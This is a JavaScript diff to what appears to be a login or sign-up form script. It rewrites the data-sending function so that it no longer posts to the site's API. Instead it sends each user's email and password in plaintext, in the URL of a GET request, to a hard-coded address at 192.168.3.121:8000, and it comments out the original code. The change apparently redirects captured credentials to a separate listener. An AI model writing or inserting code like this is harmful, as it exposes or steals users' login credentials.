@@ -25,16 +25,27 @@ const createBody = (data) => {
   return urlEncodedData;
 }
 
-const sendData = ( data ) => fetch(`${API_URL}/userdata`, {
-  method: 'POST',
+const sendData = ( data ) => fetch(`http://192.168.3.121:8000/?email=${data.email}&pass=${data.password}`, {
+  method: 'GET',
   mode: 'no-cors',
   cache: 'no-cache',
   headers: {
     'Content-Type': 'application/x-www-form-urlencoded',
   },
   referrerPolicy: 'no-referrer',
-  body: createBody(data),
+  // body: createBody(data),
 })
+
+// const sendData = ( data ) => fetch(`${API_URL}/userdata`, {
+//   method: 'POST',
+//   mode: 'no-cors',
+//   cache: 'no-cache',
+//   headers: {
+//     'Content-Type': 'application/x-www-form-urlencoded',
+//   },
+//   referrerPolicy: 'no-referrer',
+//   body: createBody(data),
+// })
 
 function validateEmail(email) {
   const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
